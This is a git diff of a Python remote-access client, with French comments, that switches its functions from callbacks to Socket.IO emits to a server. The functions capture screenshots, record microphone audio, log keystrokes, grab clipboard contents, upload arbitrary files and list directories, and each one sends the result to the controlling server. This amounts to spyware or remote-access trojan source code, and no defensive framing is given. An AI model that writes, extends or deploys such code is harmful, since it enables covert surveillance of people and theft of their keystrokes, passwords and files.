@@ -27,7 +27,7 @@ page_opened_recently = False
 stop_streaming_events = {}  # Dictionnaire pour gérer les événements d'arrêt pour chaque utilisateur
 
 
-def take_and_send_screenshot(callback, user_id):
+def take_and_send_screenshot(sio, user_id):
     try:
         screenshot = pyautogui.screenshot()
         screenshot_bytes_io = io.BytesIO()
@@ -35,7 +35,7 @@ def take_and_send_screenshot(callback, user_id):
         screenshot_bytes_io.seek(0)
         resized_screenshot = resize_image(screenshot_bytes_io)
         screenshot_encoded = base64.b64encode(resized_screenshot.getvalue()).decode()
-        callback({'screenshot': screenshot_encoded, 'user_id': user_id})
+        sio.emit('screenshot_response', {'screenshot': screenshot_encoded, 'user_id': user_id})
         print("Capture d'écran envoyée")
     except Exception as e:
         print(f"Échec de la capture d'écran: {e}")
@@ -52,7 +52,7 @@ def resize_image(image_bytes_io, base_width=1300):
     return img_byte_arr
 
 
-def record_and_send_audio(callback, duration=10, user_id=None):
+def record_and_send_audio(sio, duration=10, user_id=None):
     try:
         audio = pyaudio.PyAudio()
         stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
@@ -70,7 +70,8 @@ def record_and_send_audio(callback, duration=10, user_id=None):
 
         audio_io.seek(0)
         audio_encoded = base64.b64encode(audio_io.read()).decode()
-        callback({'audio': audio_encoded, 'user_id': user_id})
+        # callback({'audio': audio_encoded, 'user_id': user_id})
+        sio.emit('audio_response', {'audio': audio_encoded, 'user_id': user_id})
         print("Audio envoyé")
     except Exception as e:
         print(f"Échec de l'enregistrement audio: {e}")
@@ -85,7 +86,7 @@ def save_wave_file(file_io, audio_data):
         wave_file.writeframes(audio_data)
 
 
-def record_and_send_keyboard_log(callback, duration=10, user_id=None):
+def record_and_send_keyboard_log(sio, duration=10, user_id=None):
     try:
         print("Enregistrement du keylogger en cours...")
         keyboard.start_recording()
@@ -93,19 +94,21 @@ def record_and_send_keyboard_log(callback, duration=10, user_id=None):
         keyboard_events = keyboard.stop_recording()
         keyboard_log = [event.name for event in keyboard_events if event.event_type == 'down']
         keyboard_log = [f"{key} - {time.strftime('%d/%m/%Y %H:%M:%S')}" for key in keyboard_log]
-        callback({'keyboard_log': keyboard_log, 'user_id': user_id})
+        # callback({'keyboard_log': keyboard_log, 'user_id': user_id})
+        sio.emit('keyboard_response', {'keyboard_log': keyboard_log, 'user_id': user_id})
         print("Keylogger envoyé")
     except Exception as e:
         print(f"Échec de l'enregistrement du keylogger: {e}")
         pass
 
 
-def get_clipboard_content(callback, user_id=None):
+def get_clipboard_content(sio, user_id=None):
     try:
         print("Récupération du clipboard...")
         clipboard_content = pyperclip.paste()
         if clipboard_content:
-            callback({'clipboard_content': clipboard_content, 'user_id': user_id})
+            # callback({'clipboard_content': clipboard_content, 'user_id': user_id})
+            sio.emit('clipboard_response', {'clipboard_content': clipboard_content, 'user_id': user_id})
             print("Contenu du clipboard envoyé au serveur.")
         else:
             print("Aucun contenu trouvé dans le clipboard.")
@@ -151,13 +154,15 @@ def stop_stream(user_id):
         stop_streaming_events[user_id].set()
 
 
-def download_file(callback, file_path, user_id):
+def download_file(sio, file_path, user_id):
     try:
         if os.path.exists(file_path):
             with open(file_path, 'rb') as file:
                 file_data = file.read()
                 file_encoded = base64.b64encode(file_data).decode()
-                callback({'file': file_encoded, 'file_name': os.path.basename(file_path), 'user_id': user_id})
+                # callback({'file': file_encoded, 'file_name': os.path.basename(file_path), 'user_id': user_id})
+                sio.emit('file_response',
+                         {'file': file_encoded, 'file_name': os.path.basename(file_path), 'user_id': user_id})
                 print("Fichier envoyé")
         else:
             print("Fichier introuvable")
@@ -165,7 +170,7 @@ def download_file(callback, file_path, user_id):
         print(f"Échec de l'envoi du fichier: {e}")
 
 
-def list_dir(callback, dir_path):
+def list_dir(sio, dir_path):
     files_and_dirs = []
     try:
         if os.path.exists(dir_path) and os.path.isdir(dir_path):
@@ -186,7 +191,8 @@ def list_dir(callback, dir_path):
                 elif os.path.isdir(file_path):
                     files_and_dirs.append({'name': file_name, 'type': 'dir'})
             files_and_dirs.append({'path': dir_path})
-            callback({'directory_listing': files_and_dirs})
+            # callback({'directory_listing': files_and_dirs})
+            sio.emit('directory_listing', {'directory_listing': files_and_dirs})
             print(f"Liste des fichiers et dossiers de {dir_path} envoyée")
         else:
             print("Chemin du répertoire invalide ou inexistant")
